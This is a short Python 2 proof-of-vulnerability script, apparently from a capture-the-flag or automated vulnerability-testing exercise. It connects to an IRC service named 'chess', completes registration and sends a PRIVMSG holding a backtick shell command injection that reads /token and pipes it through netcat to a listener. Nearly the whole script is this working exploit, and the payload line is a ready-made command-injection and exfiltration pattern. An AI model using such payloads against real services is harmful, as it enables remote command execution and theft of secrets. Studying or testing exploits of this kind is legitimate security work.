import sys
import os
import socket
import select

def readuntil( s, u ):
    z = ''

    while z.endswith( u ) == False:
        z += s.recv(1)

    return z

def readline( s ):
    return readuntil( s, '\n')

def conn( HOST, PORT ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)


    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    return s

def send_irc_con( s ):
    s.send("NICK chesspov\n")
    s.send("USER chesspov 0 * :chesspov\n")


if __name__ == '__main__':

    print("INFO: Launching jackson PoV");

    if len(sys.argv) == 3:
        HOST=sys.argv[1]
        PORT=int(sys.argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print('[ERROR] target and port must be specified via arguments or variables.')
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])


    try:
        s = conn( HOST, PORT)
    except:
        print("Failed to connect: %s:%d" %(HOST, PORT))
        sys.exit()

    data = ""

    print readline(s)

    send_irc_con(s)

    while data.find("MOTD") == -1:
        data += readline(s)
        print data

    print data

    print("[INFO] About to send exploit")

    s.send("PRIVMSG chess : `cat /token | nc localhost 9999`\n")

    s.send("QUIT\n");


    

    